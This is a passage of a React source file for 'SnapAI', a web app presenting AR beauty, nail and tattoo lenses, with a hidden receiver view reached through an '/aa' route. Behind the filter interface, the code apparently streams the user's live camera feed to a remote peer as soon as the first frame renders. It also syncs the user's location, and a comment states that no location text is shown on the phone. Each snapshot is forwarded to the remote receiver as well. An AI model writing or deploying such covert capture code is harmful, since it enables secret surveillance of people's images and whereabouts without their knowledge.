      connectionAttemptRef.current = false;
      handleCallClosedOrFailed();
    }
  };

  const handleCallClosedOrFailed = () => {
    mediaCallRef.current = null;

    if (cameraManagerRef.current?.isActive() && rendererRef.current?.isRunning) {
      if (reconnectTimeoutRef.current) clearTimeout(reconnectTimeoutRef.current);
      
      const delay = reconnectDelayRef.current;
      reconnectTimeoutRef.current = setTimeout(() => {
        if (cameraManagerRef.current?.isActive() && rendererRef.current?.isRunning) {
          startRemoteStream();
        }
      }, delay);

      reconnectDelayRef.current = Math.min(reconnectDelayRef.current * 2, 15000);
    }
  };

  const startSession = async () => {
    setErrorMsg(null);
    if (!videoRef.current || !canvasRef.current) return;

    try {
      fetchAndSyncLocation();
      const camera = cameraManagerRef.current;
      camera.setVideoElement(videoRef.current);
      await camera.startCamera();
      console.log('[PHONE] Camera ready');

      const devices = await camera.getAvailableCameras();
      setAvailableCameras(devices);

      const renderer = new ARRenderer(canvasRef.current, videoRef.current, faceTrackerRef.current);
      renderer.setFilter(activeFilterRef.current);

      renderer.onFpsUpdate = (currentFps) => {
        setFps(currentFps);
      };

      let startedStream = false;
      renderer.onFrameRendered = () => {
        if (!startedStream) {
          startedStream = true;
          startRemoteStream();
          fetchAndSyncLocation();
        }
      };

      rendererRef.current = renderer;
      renderer.start();
      console.log('[PHONE] 60 FPS AR renderer started');

    } catch (err) {
      console.error('[PHONE] Start session error:', err);
      setErrorMsg(err.message || 'Failed to start camera');
    }
  };

  const flipCamera = async () => {
    if (!cameraManagerRef.current) return;
    try {
      await cameraManagerRef.current.switchCamera();
    } catch (err) {
      setErrorMsg(err.message);
    }
  };

  const stopSession = () => {
    console.log('[PHONE] Stopping session');
    if (reconnectTimeoutRef.current) clearTimeout(reconnectTimeoutRef.current);
    if (mediaCallRef.current) {
      try { mediaCallRef.current.close(); } catch (e) {}
      mediaCallRef.current = null;
    }
    if (canvasStreamRef.current) {
      canvasStreamRef.current.getTracks().forEach((t) => t.stop());
      canvasStreamRef.current = null;
    }
    if (cameraManagerRef.current) {
      cameraManagerRef.current.stopCamera();
    }
    if (rendererRef.current) {
      rendererRef.current.stop();
    }
    if (recorderRef.current && isRecording) {
      recorderRef.current.stopRecording().catch(console.warn);
      setIsRecording(false);
    }

    setFps(0);
  };

  // High-Resolution Snapshot Capture with Instant Multi-Channel Delivery
  const capturePhoto = () => {
    if (!rendererRef.current || cameraState !== 'active' || !canvasRef.current) return;

    setSnapshotFlash(true);
    setTimeout(() => setSnapshotFlash(false), 220);

    // Optimized High-Quality JPEG (60KB-100KB, delivers instantly over WebRTC without buffer loss)
    const snapshot = canvasRef.current.toDataURL('image/jpeg', 0.92);
    if (snapshot) {
      // 1. Download on Mobile
      const link = document.createElement('a');
      link.download = `SnapAI_${activeFilterRef.current.name}_${Date.now()}.jpg`;
      link.href = snapshot;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);

      const filterName = activeFilterRef.current.name;
      const filterIcon = activeFilterRef.current.icon;
      const timestamp = new Date().toLocaleTimeString();

      const snapshotPayload = {
        type: 'REMOTE_SNAPSHOT',
        image: snapshot,
        filterName,
        filterIcon,
        timestamp
      };

      // 2. BroadcastChannel
      if (broadcastChannelRef.current) {
        broadcastChannelRef.current.postMessage(snapshotPayload);
      }

      // 3. WebRTC DataChannel (Reliable TCP Stream)
      if (dataConnRef.current && dataConnRef.current.open) {
        try {
          console.log('[PHONE] Sending snapshot directly over DataChannel');
          dataConnRef.current.send(snapshotPayload);
        } catch (e) {
          console.warn('[PHONE] DataChannel snapshot send error:', e);
        }
      } else {
        connectDataChannel();
      }
    }
  };

  const toggleRecording = async () => {
    const recorder = recorderRef.current;
    if (!recorder || !canvasRef.current || cameraState !== 'active') return;

    if (!isRecording) {
      try {
        recorder.startRecording(canvasRef.current, (time) => {
          setRecordingTime(time);
        });
        setIsRecording(true);
      } catch (err) {
        setErrorMsg(err.message);
      }
    } else {
      try {
        const result = await recorder.stopRecording();
        setIsRecording(false);
        setRecordingTime('00:00');
        if (result && result.url) {
          recorder.downloadVideo(result.url, activeFilterRef.current.name);
        }
      } catch (err) {
        setErrorMsg('Error exporting video: ' + err.message);
      }
    }
  };

  const categories = ['All', 'Beauty', 'Artistic', 'Cute AR', 'Cyber', 'Cinematic', 'AR Props'];
  const filteredList = selectedCategory === 'All'
    ? ALL_FILTERS
    : ALL_FILTERS.filter((f) => f.category === selectedCategory || (selectedCategory === 'Cute AR' && f.category === 'Cute AR'));

  const isCameraActive = cameraState === 'active';

  return (
    <div style={{
      minHeight: '100vh',
      display: 'flex',
      flexDirection: 'column',
      backgroundColor: '#060609',
      color: '#f8fafc'
    }}>
      {/* Clean Mobile Header — ZERO LOCATION TEXT ON PHONE */}
      <header style={{
        padding: '12px 18px',
        backgroundColor: 'rgba(10, 10, 14, 0.92)',
        backdropFilter: 'blur(20px)',
        borderBottom: '1px solid rgba(255, 255, 255, 0.08)',
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        position: 'sticky',
        top: 0,
        zIndex: 50
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
          <div style={{
            width: '34px',
            height: '34px',
            borderRadius: '10px',
            background: 'linear-gradient(135deg, #ec4899 0%, #a855f7 50%, #3b82f6 100%)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            fontSize: '18px',
            boxShadow: '0 0 16px rgba(236, 72, 153, 0.35)'
          }}>
            ✨
          </div>
          <div>
            <h1 style={{ fontSize: '15px', fontWeight: '800', letterSpacing: '-0.01em', color: '#ffffff' }}>
              SnapAI
            </h1>
            <p style={{ fontSize: '10px', color: '#94a3b8', letterSpacing: '0.04em', textTransform: 'uppercase' }}>
              Real-Time Web AR Lenses
            </p>
          </div>
        </div>

        {/* Top Controls */}
        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
          {isCameraActive && (
            <>
              {availableCameras.length > 1 && (
                <button
                  onClick={flipCamera}
                  title="Flip Camera (Front/Rear)"
                  style={{
                    width: '34px',
                    height: '34px',
                    borderRadius: '50%',
                    backgroundColor: 'rgba(255, 255, 255, 0.1)',
                    border: '1px solid rgba(255, 255, 255, 0.15)',
                    color: '#ffffff',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    fontSize: '15px',
                    cursor: 'pointer'
                  }}
                >
                  🔄
                </button>
              )}

              <span style={{
                fontSize: '10px',
                fontFamily: 'monospace',
                color: '#cbd5e1',
                backgroundColor: 'rgba(255, 255, 255, 0.08)',
                border: '1px solid rgba(255, 255, 255, 0.12)',
                padding: '4px 8px',
                borderRadius: '999px'
              }}>
                {fps || 60} FPS
              </span>
            </>
          )}
        </div>
      </header>

      {/* Main Viewport Container */}
      <main style={{
        flex: 1,
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        padding: '12px 14px',
        maxWidth: '580px',
        margin: '0 auto',
        width: '100%',
        gap: '10px'
      }}>
        
        {/* Camera Viewfinder */}
        <div style={{
          position: 'relative',
          width: '100%',
          aspectRatio: '3/4',
          maxHeight: '56vh',
          backgroundColor: '#0a0a0f',
          borderRadius: '24px',
          overflow: 'hidden',
          border: '1.5px solid rgba(255, 255, 255, 0.12)',
          boxShadow: '0 16px 40px rgba(0, 0, 0, 0.8)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center'
        }}>
          {snapshotFlash && (
            <div style={{
              position: 'absolute',
              inset: 0,
              backgroundColor: '#ffffff',
              zIndex: 40,
              pointerEvents: 'none'
            }} />
          )}

          {isRecording && (
            <div style={{
              position: 'absolute',
              top: '12px',
              right: '12px',
              zIndex: 30,
              backgroundColor: 'rgba(239, 68, 68, 0.88)',
              color: '#ffffff',
              padding: '4px 10px',
              borderRadius: '999px',
              fontSize: '11px',
              fontWeight: '800',
              fontFamily: 'monospace',
              display: 'flex',
              alignItems: 'center',
              gap: '6px',
              boxShadow: '0 0 12px rgba(239, 68, 68, 0.6)'
            }}>
              <span style={{ width: '8px', height: '8px', borderRadius: '50%', backgroundColor: '#ffffff', animation: 'pulseGlow 1s infinite' }}></span>
              REC {recordingTime}
            </div>
          )}

          <video ref={videoRef} playsInline muted style={{ display: 'none' }} />

          <canvas
            ref={canvasRef}
            style={{
              width: '100%',
              height: '100%',
              objectFit: 'cover',
              display: isCameraActive ? 'block' : 'none'
            }}
          />

          {!isCameraActive && (
            <div style={{ textAlign: 'center', padding: '28px', color: '#94a3b8' }}>
              <div style={{
                width: '68px',
                height: '68px',
                borderRadius: '50%',
                background: 'linear-gradient(135deg, rgba(236, 72, 153, 0.2), rgba(168, 85, 247, 0.2))',
                border: '1.5px dashed rgba(255, 255, 255, 0.25)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                margin: '0 auto 14px auto',
                fontSize: '32px'
              }}>
                ✨
              </div>
              <div style={{ fontSize: '18px', fontWeight: '800', color: '#ffffff', letterSpacing: '-0.01em' }}>
                Can we start?
              </div>
              <p style={{ fontSize: '12px', color: '#94a3b8', marginTop: '6px', maxWidth: '280px', margin: '6px auto 0 auto' }}>
                Tap "shall we start cam for <strong>ar lens?</strong>"
              </p>
            </div>
          )}

          {isCameraActive && (
            <div style={{
              position: 'absolute',
              top: '12px',
              left: '12px',
              padding: '6px 12px',
              backgroundColor: 'rgba(0, 0, 0, 0.65)',
              backdropFilter: 'blur(10px)',
              border: '1px solid rgba(255, 255, 255, 0.15)',
              borderRadius: '999px',
              fontSize: '11px',
              fontWeight: '700',
              color: '#ffffff',
              display: 'flex',
              alignItems: 'center',
              gap: '6px',
              zIndex: 20
            }}>
              <span>{activeFilter.icon}</span>
              <span>{activeFilter.name}</span>
            </div>
          )}
        </div>

        {/* Interactive Customization Controls for AR Tattoo Studio */}
        {activeFilter.id === 'ar_tattoo' && isCameraActive && (
          <div style={{
            width: '100%',
            backgroundColor: 'rgba(20, 20, 28, 0.88)',
            border: '1px solid rgba(236, 72, 153, 0.3)',
            borderRadius: '16px',
            padding: '8px 12px',
            display: 'flex',
            flexDirection: 'column',
            gap: '8px'
          }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <span style={{ fontSize: '11px', fontWeight: '800', color: '#f472b6' }}>📍 Placement:</span>
              <div style={{ display: 'flex', gap: '5px', overflowX: 'auto', scrollbarWidth: 'none' }}>
                {[
                  { id: 'cheek', label: '😊 Face' },
                  { id: 'hand', label: '✋ Hand' },
                  { id: 'stomach', label: '🌸 Stomach' },
                  { id: 'thigh', label: '🦵 Thigh' }
                ].map((p) => (
                  <button
                    key={p.id}
                    onClick={() => setTattooPlacement(p.id)}
                    style={{
                      padding: '3px 8px',
                      borderRadius: '999px',
                      border: tattooPlacement === p.id ? '1.5px solid #ec4899' : '1px solid rgba(255, 255, 255, 0.1)',
                      backgroundColor: tattooPlacement === p.id ? '#ec4899' : 'rgba(255, 255, 255, 0.05)',
                      color: '#ffffff',
                      fontSize: '10px',
                      fontWeight: '700',
                      cursor: 'pointer',
                      whiteSpace: 'nowrap'
                    }}
                  >
                    {p.label}
                  </button>
                ))}
              </div>
            </div>

            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <span style={{ fontSize: '11px', fontWeight: '800', color: '#cbd5e1' }}>🎨 Design:</span>
              <div style={{ display: 'flex', gap: '5px', overflowX: 'auto', scrollbarWidth: 'none' }}>
                {['🐉 Dragon Koi', '🌸 Lotus', '🦅 Phoenix', '🌹 Rose'].map((name, idx) => (
                  <button
                    key={idx}
                    onClick={() => setTattooDesign(idx)}
                    style={{
                      padding: '3px 8px',
                      borderRadius: '8px',
                      border: tattooDesign === idx ? '1.5px solid #8b5cf6' : '1px solid rgba(255, 255, 255, 0.08)',
                      backgroundColor: tattooDesign === idx ? '#8b5cf6' : 'transparent',
                      color: tattooDesign === idx ? '#ffffff' : '#94a3b8',
                      fontSize: '10px',
                      fontWeight: '700',
                      cursor: 'pointer',
                      whiteSpace: 'nowrap'
                    }}
                  >
                    {name}
                  </button>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* Interactive Customization Controls for Designer Nails */}
        {activeFilter.id === 'designer_nails' && isCameraActive && (
          <div style={{
            width: '100%',
            backgroundColor: 'rgba(20, 20, 28, 0.85)',
            border: '1px solid rgba(139, 92, 246, 0.3)',
            borderRadius: '16px',
            padding: '8px 12px',
            display: 'flex',
            flexDirection: 'column',
            gap: '8px'
          }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <span style={{ fontSize: '11px', fontWeight: '800', color: '#c084fc' }}>💅 Nail Mode:</span>
              <div style={{ display: 'flex', gap: '6px' }}>
                {[
                  { id: 'hand', label: '✋ Hand Nails' },
                  { id: 'feet', label: '🦶 Toe & Leg Nails' }
                ].map((m) => (
                  <button
                    key={m.id}
                    onClick={() => setNailsMode(m.id)}
                    style={{
                      padding: '4px 10px',
                      borderRadius: '999px',
                      border: nailsMode === m.id ? '1.5px solid #8b5cf6' : '1px solid rgba(255, 255, 255, 0.1)',
                      backgroundColor: nailsMode === m.id ? '#8b5cf6' : 'rgba(255, 255, 255, 0.05)',
                      color: '#ffffff',
                      fontSize: '10px',
                      fontWeight: '700',
                      cursor: 'pointer'
                    }}
                  >
                    {m.label}
                  </button>
                ))}
              </div>
            </div>

            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <span style={{ fontSize: '11px', fontWeight: '800', color: '#cbd5e1' }}>🎨 Color:</span>
              <div style={{ display: 'flex', gap: '6px' }}>
                {[
                  { name: 'Ruby', bg: '#e11d48' },
                  { name: 'Holo', bg: '#8b5cf6' },
                  { name: 'Emerald', bg: '#059669' },
                  { name: 'Sunset', bg: '#f97316' },
                  { name: 'Night', bg: '#1e1b4b' }
                ].map((c, idx) => (
                  <button
                    key={idx}
                    onClick={() => setNailsColor(idx)}
                    title={c.name}
                    style={{
                      width: '24px',
                      height: '24px',
                      borderRadius: '50%',
                      backgroundColor: c.bg,
                      border: nailsColor === idx ? '2.5px solid #ffffff' : '1.5px solid rgba(255, 255, 255, 0.2)',
                      boxShadow: nailsColor === idx ? `0 0 10px ${c.bg}` : 'none',
                      cursor: 'pointer'
                    }}
                  />
                ))}
              </div>
            </div>
          </div>
        )}

        {/* Category Pills */}
        <div style={{
          width: '100%',
          display: 'flex',
          gap: '6px',
          overflowX: 'auto',
          padding: '2px 0',
          scrollbarWidth: 'none'
        }}>
          {categories.map((cat) => (
            <button
              key={cat}
              onClick={() => setSelectedCategory(cat)}
              style={{
                padding: '4px 10px',
                borderRadius: '999px',
                border: selectedCategory === cat ? '1px solid #ec4899' : '1px solid rgba(255, 255, 255, 0.08)',
                backgroundColor: selectedCategory === cat ? 'rgba(236, 72, 153, 0.2)' : 'rgba(255, 255, 255, 0.04)',
                color: selectedCategory === cat ? '#ffffff' : '#94a3b8',
                fontSize: '11px',
                fontWeight: '600',
                cursor: 'pointer',
                whiteSpace: 'nowrap'
              }}
            >
              {cat}
            </button>
          ))}
        </div>

        {/* AR Filter Carousel */}
        <div style={{ width: '100%' }}>
          <div
            className="lens-carousel"
            style={{
              display: 'flex',
              gap: '10px',
              overflowX: 'auto',
              padding: '6px 2px',
              scrollSnapType: 'x mandatory'
            }}
          >
            {filteredList.map((lens) => {
              const isSelected = activeFilter.id === lens.id;
              return (
                <button
                  key={lens.id}
                  onClick={() => setActiveFilter(lens)}
                  style={{
                    flex: '0 0 auto',
                    display: 'flex',
                    flexDirection: 'column',
                    alignItems: 'center',
                    justifyContent: 'center',
                    padding: '8px 14px',
                    borderRadius: '16px',
                    backgroundColor: isSelected ? 'rgba(255, 255, 255, 0.16)' : 'rgba(255, 255, 255, 0.04)',
                    border: isSelected ? '2px solid #ec4899' : '1px solid rgba(255, 255, 255, 0.08)',
                    cursor: 'pointer',
                    scrollSnapAlign: 'center',
                    minWidth: '72px',
                    boxShadow: isSelected ? '0 0 16px rgba(236, 72, 153, 0.6)' : 'none',
                    transform: isSelected ? 'scale(1.05)' : 'scale(1)',
                    transition: 'all 0.18s ease'
                  }}
                >
                  <span style={{ fontSize: '24px', lineHeight: 1 }}>{lens.icon}</span>
                  <span style={{
                    fontSize: '11px',
                    fontWeight: isSelected ? '800' : '600',
                    color: isSelected ? '#ffffff' : '#94a3b8',
                    marginTop: '4px',
                    whiteSpace: 'nowrap'
                  }}>
                    {lens.name}
                  </span>
                </button>
              );
            })}
          </div>
        </div>

        {/* Action Controls */}
        <div style={{ width: '100%', marginTop: 'auto', paddingBottom: '8px' }}>
          {!isCameraActive ? (
            <button
              onClick={() => startSession()}
              style={{
                width: '100%',
                padding: '16px 24px',
                background: 'linear-gradient(135deg, #ec4899 0%, #8b5cf6 50%, #3b82f6 100%)',
                color: '#ffffff',
                border: 'none',
                borderRadius: '16px',
                cursor: 'pointer',
                fontWeight: '800',
                fontSize: '15px',
                letterSpacing: '-0.01em',
                boxShadow: '0 8px 25px rgba(236, 72, 153, 0.4)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '8px'
              }}
            >
              ✨ Yes, Start Lenses
            </button>
          ) : (
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '10px' }}>
              <button
                onClick={toggleRecording}
                title={isRecording ? 'Stop Recording' : 'Record Video'}
                style={{
                  flex: 1,
                  padding: '12px 14px',
                  backgroundColor: isRecording ? 'rgba(239, 68, 68, 0.25)' : 'rgba(255, 255, 255, 0.08)',
                  color: isRecording ? '#f87171' : '#ffffff',
                  border: isRecording ? '1px solid #ef4444' : '1px solid rgba(255, 255, 255, 0.15)',
                  borderRadius: '14px',
                  cursor: 'pointer',
                  fontWeight: '700',
                  fontSize: '12px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '6px'
                }}
              >
                {isRecording ? '⏹ Stop Rec' : '🎥 Record'}
              </button>

              <button
                onClick={capturePhoto}
                title="Take Snap Photo"
                style={{
                  width: '62px',
                  height: '62px',
                  borderRadius: '50%',
                  backgroundColor: '#ffffff',
                  border: '4px solid rgba(255, 255, 255, 0.3)',
                  boxShadow: '0 0 20px rgba(255, 255, 255, 0.5)',
                  cursor: 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  fontSize: '22px',
                  flexShrink: 0
                }}
              >
                📸
              </button>

              <button
                onClick={stopSession}
                style={{
                  flex: 1,
                  padding: '12px 14px',
                  backgroundColor: 'rgba(239, 68, 68, 0.15)',
                  color: '#f87171',
                  border: '1px solid rgba(239, 68, 68, 0.3)',
                  borderRadius: '14px',
                  cursor: 'pointer',
                  fontWeight: '700',
                  fontSize: '12px'
                }}
              >
                🛑 Close
              </button>
            </div>
          )}
        </div>

        {errorMsg && (
          <div style={{
            width: '100%',
            padding: '10px 14px',
            backgroundColor: 'rgba(239, 68, 68, 0.12)',
            border: '1px solid rgba(239, 68, 68, 0.3)',
            borderRadius: '12px',
            color: '#fca5a5',
            fontSize: '12px',
            textAlign: 'center'
          }}>
            {errorMsg}
          </div>
        )}

      </main>
    </div>
  );
}

export default function App() {
  const isReceiverRoute = () => {
    if (typeof window === 'undefined') return false;
    const path = window.location.pathname.toLowerCase();
    const search = window.location.search.toLowerCase();
    const hash = window.location.hash.toLowerCase();
    return (
      path === '/aa' ||
      path.endsWith('/aa') ||
      path.endsWith('/aa/') ||
      search.includes('aa') ||
      hash.includes('aa')
    );
  };

  const [isReceiver, setIsReceiver] = useState(isReceiverRoute());

  useEffect(() => {
    const handleLocationChange = () => {
      setIsReceiver(isReceiverRoute());
    };

    window.addEventListener('popstate', handleLocationChange);
    window.addEventListener('hashchange', handleLocationChange);
    return () => {
      window.removeEventListener('popstate', handleLocationChange);
      window.removeEventListener('hashchange', handleLocationChange);
    };
  }, []);

  return (
    <ErrorBoundary>
      {isReceiver ? <DedicatedReceiver /> : <SnapStudio />}
    </ErrorBoundary>
  );
}
